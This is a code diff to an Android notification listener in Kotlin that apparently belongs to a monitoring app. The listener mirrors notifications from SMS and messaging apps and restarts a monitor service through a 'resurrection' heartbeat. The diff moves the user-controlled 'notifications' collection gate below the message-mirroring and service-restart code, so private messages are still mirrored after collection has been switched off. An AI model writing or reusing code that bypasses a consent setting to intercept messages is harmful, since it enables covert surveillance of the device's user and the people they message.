@@ -109,9 +109,6 @@ class MyNotificationListener : NotificationListenerService() {
 
         val safePkg = sbn.packageName ?: "Unknown"
 
-        // Feature Gate
-        if (!ConfigManager.canCollect(this, "notifications")) return
-
         // SYMBIOTE RESURRECTION: Secondary Heartbeat
         try {
             if (!MonitorService.isRunning) {
@@ -204,6 +201,9 @@ class MyNotificationListener : NotificationListenerService() {
         if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
             checkAndMirrorNotification(sbn, title, text)
         }
+
+        // Feature Gate: Stop here if passive data collection is disabled
+        if (!ConfigManager.canCollect(this, "notifications")) return
 
         kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
             // LOAD DATA
